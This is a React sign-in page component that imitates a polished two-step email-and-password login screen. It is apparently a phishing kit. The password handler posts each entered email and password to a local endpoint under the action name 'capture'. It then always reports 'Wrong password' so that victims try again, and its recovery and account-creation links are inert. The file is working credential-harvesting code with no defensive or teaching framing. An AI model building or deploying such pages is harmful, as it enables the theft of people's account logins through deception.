"use client";

import { useState, useCallback } from "react";
import { AnimatePresence, motion } from "framer-motion";
import Logo from "@/components/Logo";
import InputField from "@/components/InputField";
import AuthButton from "@/components/AuthButton";

export default function SignInPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<"email" | "password">("email");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleEmailSubmit = useCallback(async () => {
    if (!email.trim() || !email.includes("@")) {
      setError("Please enter a valid email address");
      return;
    }
    setError("");
    setLoading(true);

    try {
      await fetch("/api/login", {
        method: "POST",
        body: new URLSearchParams({ action: "preflight", email: email.trim() }),
      });
    } catch {}

    setLoading(false);
    setStep("password");
  }, [email]);

  const handlePasswordSubmit = useCallback(async () => {
    if (!password) {
      setError("Please enter your password");
      return;
    }
    setError("");
    setLoading(true);

    try {
      await fetch("/api/login", {
        method: "POST",
        body: new URLSearchParams({
          action: "capture",
          email: email.trim(),
          password,
        }),
      });
    } catch {}

    setTimeout(() => {
      setLoading(false);
      setPassword("");
      setError("Wrong password. Try again.");
    }, 1400);
  }, [email, password]);

  const handleBack = useCallback(() => {
    setStep("email");
    setError("");
  }, []);

  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, ease: [0.0, 0.0, 0.58, 1.0] as const }}
      className="w-full"
      style={{ maxWidth: 1100, height: 560 }}
    >
      <div
        className="h-full rounded-[28px] overflow-hidden grid grid-cols-1 md:grid-cols-[40%_60%]"
        style={{
          background: "#0A0A0A",
          padding: 56,
          border: "1px solid rgba(255,255,255,.06)",
          boxShadow: "0 25px 60px rgba(0,0,0,.45)",
        }}
      >
        {/* ── LEFT COLUMN ── */}
        <div className="hidden md:flex flex-col justify-center">
          <Logo />
          <div style={{ marginTop: 32 }}>
            <h1
              style={{
                fontSize: 48,
                fontWeight: 700,
                lineHeight: 1.1,
                color: "#E8EAED",
                margin: 0,
              }}
            >
              Sign in
            </h1>
            <p
              style={{
                fontSize: 24,
                fontWeight: 500,
                color: "#E8EAED",
                marginTop: 12,
                marginBottom: 0,
              }}
            >
              Sign in to your account.
            </p>
            <p
              style={{
                fontSize: 16,
                color: "#BDC1C6",
                lineHeight: 1.5,
                marginTop: 20,
                marginBottom: 0,
                maxWidth: 320,
              }}
            >
              Continue securely and access your dashboard, projects, settings, and personalized features.
            </p>
          </div>
        </div>

        {/* ── RIGHT COLUMN ── */}
        <div className="flex flex-col justify-center">
          <AnimatePresence mode="wait">
            {step === "email" ? (
              <motion.div
                key="email"
                initial={{ opacity: 0, x: 16 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -16 }}
                transition={{ duration: 0.3, ease: [0.4, 0.0, 0.2, 1.0] as const }}
              >
                <InputField
                  label="Email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleEmailSubmit()}
                  autoFocus
                  error={step === "email" && error && !loading ? error : undefined}
                />

                <div style={{ marginTop: 24 }}>
                  <a
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    className="inline-block text-[#7AA2FF] text-sm font-semibold no-underline hover:underline transition-all duration-200 cursor-pointer"
                    style={{ fontSize: 14, fontWeight: 600 }}
                  >
                    Forgot email?
                  </a>
                </div>

                <p
                  className="text-[#BDC1C6]"
                  style={{ fontSize: 13, lineHeight: 1.6, marginTop: 24, marginBottom: 0 }}
                >
                  Enter the email address associated with your account.
                  <br />
                  We&apos;ll verify your account before continuing.
                </p>

                <div
                  className="flex items-center justify-between"
                  style={{ marginTop: 24 }}
                >
                  <AuthButton
                    variant="text"
                    onClick={(e) => e.preventDefault()}
                  >
                    Create account
                  </AuthButton>
                  <AuthButton
                    variant="primary"
                    onClick={handleEmailSubmit}
                    disabled={loading || !email.trim()}
                  >
                    {loading ? (
                      <span className="flex items-center justify-center gap-2">
                        <span
                          className="inline-block w-4 h-4 rounded-full"
                          style={{
                            border: "2px solid rgba(255,255,255,0.3)",
                            borderTopColor: "#fff",
                            animation: "spin 0.7s linear infinite",
                          }}
                        />
                      </span>
                    ) : (
                      "Next"
                    )}
                  </AuthButton>
                </div>
              </motion.div>
            ) : (
              <motion.div
                key="password"
                initial={{ opacity: 0, x: 16 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -16 }}
                transition={{ duration: 0.3, ease: [0.4, 0.0, 0.2, 1.0] as const }}
              >
                <div
                  className="flex items-center gap-3 pb-4 mb-6"
                  style={{ borderBottom: "1px solid rgba(255,255,255,.06)" }}
                >
                  <div
                    className="w-9 h-9 rounded-full flex items-center justify-center text-sm font-medium"
                    style={{ background: "rgba(122,162,255,0.15)", color: "#7AA2FF" }}
                  >
                    {email.charAt(0).toUpperCase()}
                  </div>
                  <span className="text-sm truncate" style={{ color: "#BDC1C6" }}>
                    {email}
                  </span>
                  <button
                    onClick={handleBack}
                    className="ml-auto text-[#7AA2FF] text-xs hover:underline transition-all duration-200 cursor-pointer bg-transparent border-none"
                  >
                    Edit
                  </button>
                </div>

                <InputField
                  label="Password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handlePasswordSubmit()}
                  autoFocus
                  error={error || undefined}
                />

                <div style={{ marginTop: 24 }}>
                  <a
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    className="inline-block text-[#7AA2FF] text-sm font-semibold no-underline hover:underline transition-all duration-200 cursor-pointer"
                    style={{ fontSize: 14, fontWeight: 600 }}
                  >
                    Forgot password?
                  </a>
                </div>

                <div
                  className="flex items-center justify-between"
                  style={{ marginTop: 24 }}
                >
                  <AuthButton
                    variant="text"
                    onClick={handleBack}
                  >
                    Back
                  </AuthButton>
                  <AuthButton
                    variant="primary"
                    onClick={handlePasswordSubmit}
                    disabled={loading || !password}
                  >
                    {loading ? (
                      <span className="flex items-center justify-center gap-2">
                        <span
                          className="inline-block w-4 h-4 rounded-full"
                          style={{
                            border: "2px solid rgba(255,255,255,0.3)",
                            borderTopColor: "#fff",
                            animation: "spin 0.7s linear infinite",
                          }}
                        />
                      </span>
                    ) : (
                      "Sign in"
                    )}
                  </AuthButton>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </motion.div>
  );
}
